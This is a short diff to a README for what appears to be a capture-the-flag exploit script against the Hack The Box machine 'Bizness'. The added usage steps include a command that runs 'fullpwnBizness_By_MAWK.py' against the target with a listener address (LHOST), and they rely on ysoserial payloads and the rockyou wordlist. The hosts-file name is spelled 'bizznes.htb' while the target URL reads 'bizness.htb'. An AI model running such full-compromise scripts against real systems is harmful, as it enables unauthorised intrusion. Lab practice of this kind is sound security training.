@@ -3,7 +3,11 @@
 
 $ pip install -r requirements.txt
 
+make sure to add bizznes.htb into ur /etc/hosts
 
+then run the below command
 $ Python3 fullpwnBizness_By_MAWK.py https://bizness.htb/ <LHOST>  
+
+
 
 make sure rockyou.txt and ysoserial are all in your executing directory
